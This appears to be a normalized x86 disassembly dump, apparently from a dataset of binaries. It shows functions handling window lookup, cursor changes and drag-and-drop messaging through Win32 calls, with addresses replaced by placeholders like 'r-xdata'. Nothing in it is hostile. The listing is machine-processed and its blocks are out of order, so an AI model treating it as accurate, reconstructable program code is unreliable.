jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_46e0c8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_46e0a4
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_46e0a4
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
mov ecx eax
neg ecx
mov edx esi
neg edx
lea eax [ ebx + 0x4c ]
call sub_40ac74
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_46e188
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
cmp esi [ ebx + 0x4 ]
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea edx [ ebx + 0xc ]
lea eax [ ebp - 0x10 ]
call sub_40abd8
test al al
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ ebx ]
jne r-xdata
xor eax eax
mov [ ebx + 0x14 ] 0x1
jmp r-xdata
mov [ ebx + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor edx edx
mov [ ebx + 0x8 ] edx
jmp r-xdata
sub_46e1e8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov esi eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_46e628
mov ebx eax
mov [ ebp - 0x14 ] ebx
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x170 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_46d414
mov ebx eax
test ebx ebx
je r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx esi
jmp r-xdata
jmp r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
call sub_479ce0
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov ebx eax
mov eax ebx
call sub_479ce0
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_479ce0
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax esi
mov si 0xffbc
call sub_40587c
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x8 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_46e188
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ebx eax
mov eax ebx
call sub_479ce0
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea ecx [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
lea eax [ ebp - 0x2c ]
call sub_40abfc
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x90 ]
call sub_479ce0
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_46e384
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_479ce0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_479ce0
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_46e3c8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xbc ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_46db98
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1ea ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_46e1e8
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4305a0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x5c ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_479ce0
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_46e384
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbb
call sub_40587c
test al al
je r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbc
call sub_40587c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x28 ]
call sub_40abd8
test al al
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_46dae0
sub_46e514
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_430608
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_430438
mov edx esi
mov eax [ rw-data ]
call sub_4303e0
jmp r-xdata
sub_46e570
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call __imp_SendMessageW
mov ecx eax
sub_46e5c8
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_407134
push eax
call GlobalFindAtomW
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_46d3e0
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropW
test eax eax
setne bl
jmp r-xdata
sub_46e628
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_46e5c8
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_46e654
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_46e3c8
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_46e628
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_46e570
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_479ce0
mov [ esi ] eax
sub_46e6a4
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x14 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_46e570
cmp eax 0x1
sbb eax eax
inc eax
sub_46e6e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ esi + 0x1eb ] 0x0
je r-xdata
cmp [ esi + 0x1c4 ] 0x0
je r-xdata
mov eax esi
call sub_47843c
test eax eax
je r-xdata
mov eax esi
call sub_47843c
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_46f174
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x1c4 ]
call sub_4305a0
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x1c4 ]
call sub_430608
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov ebx [ ebx + 0x34 ]
mov edx edi
mov eax esi
call sub_478450
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_46e780
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
movzx ecx [ eax + 0x8b ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_46e654
mov esi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ ebx ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ ebx + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_47c3c0
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ ebx ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov al 0x1
call sub_46e6a4
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp esi [ eax + 0x14 ]
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov al 0x2
call sub_46e6a4
mov edx eax
mov ecx [ ebx ]
mov eax [ rw-data ]
mov edi [ eax ]
call [ edi + 0x4 ]
mov edi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax [ rw-data ]
mov eax [ eax + 0x14 ]
call sub_470990
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x18 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x1c ] edx
mov eax [ rw-data ]
mov [ eax + 0x14 ] esi
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ ebx ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_46e6a4
cmp [ rw-data ] 0x0
je r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49dac4
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_47c370
mov eax [ rw-data ]
cmp [ eax + 0x7a ] 0x0
jne r-xdata
test [ esi + 0x51 ] 0x20
jne r-xdata
call sub_46e6e0
mov edi eax
mov eax [ rw-data ]
mov [ eax + 0x60 ] edi
test edi edi
jne r-xdata
mov edx [ ebx + 0x4 ]
push edx
mov ecx [ ebx ]
mov eax [ rw-data ]
mov edx [ eax + 0x40 ]
xchg edx eax
mov si 0xffe9
call sub_40587c
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax [ rw-data ]
call sub_47c4c8
jmp r-xdata
mov eax [ ebx + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ ebx ]
mov eax [ rw-data ]
call sub_47c3c0
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax edi
call sub_470990
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffda
call sub_40587c
mov edx [ rw-data ]
mov [ edx + 0x5c ] al
mov eax [ rw-data ]
lea edx [ eax + 0x18 ]
mov eax [ rw-data ]
mov eax [ eax + 0x14 ]
mov si 0xffda
call sub_40587c
mov edx [ rw-data ]
mov [ edx + 0x5c ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_47c53c
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_49dac4
push eax
call SetCursor
mov ebx [ rw-data ]
lea edx [ ebx + 0x64 ]
lea eax [ ebx + 0x4c ]
mov ecx 0x10
call sub_410f30
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x4c ]
lea edi [ eax + 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_46ea68
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x14 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_46dc3c
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x4c ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x28 ] ecx
mov [ edx + 0x2c ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x28 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_47c3c0
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x30 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_46e780
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_46ebd8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor ecx ecx
push ebp
push sub_46ed73
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x8b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe5
call sub_40587c
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffde
call sub_40587c
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x40 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46df84
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_46ea68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_46de4c
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x40 ]
cmp [ esi + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x4c
push eax
mov eax esi
call sub_479ce0
push eax
call GetWindowRect
jmp r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_47085c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x24 ]
mov [ eax + 0x50 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_40580c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x4c ]
lea edi [ eax + 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x50 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x4c ]
mov edx [ eax + 0x40 ]
add ecx [ edx + 0x48 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x50 ]
add ecx [ edx + 0x4c ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x20 ]
mov [ eax + 0x54 ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x58 ] edx
sub_46ed90
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x14 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x60 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x90 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x14 ]
mov ecx [ rw-data ]
mov si 0xffbd
call sub_40587c
mov ebx eax
sub_46ee04
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x9 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x5 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_46f119
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_46f0a7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x5 ] 0x1
mov eax [ rw-data ]
movzx edx [ ebp - 0x1 ]
mov [ eax + 0x20 ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_46dc70
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_405830
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x14 ] 0x0
sete al
mov [ ebx + 0x74 ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0x14 ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x14 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x18 ]
mov [ ebp - 0x14 ] edx
mov edx [ eax + 0x1c ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov [ ebp - 0x9 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x74 ] 0x0
jne r-xdata
push ebp
call sub_46ed90
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
call sub_46e6a4
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_47c53c
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f0ae
mov eax [ rw-data ]
call sub_4055f0
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ ebx + 0x40 ]
mov dl 0x1
call sub_4946a4
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x5 ] 0x0
mov eax [ ebp - 0x10 ]
push eax
movzx eax [ ebp - 0x9 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov ecx [ ebp - 0x14 ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_472314
jmp r-xdata
mov edx [ eax + 0x290 ]
cmp edx [ ebx + 0x40 ]
jne r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_46f04b
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ rw-data ]
mov edx [ edx + 0x14 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_46e570
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0x14 ] edx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
call sub_499690
retn
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
sub_46f0ae
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40580c
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_4055f0
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_40580c
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
sub_46f140
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_46d414
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_46f174
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_46f140
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
push 0x0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebp
call sub_470990
lea edx [ esp + 0x8 ]
mov ecx ebx
mov eax ebp
call sub_476708
test eax eax
je r-xdata
mov esi eax
sub_46f1c0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_4303e0
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ ebx ] eax
sub_46f1e8
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov eax [ ebx ]
mov esi [ eax + 0x8 ]
test esi esi
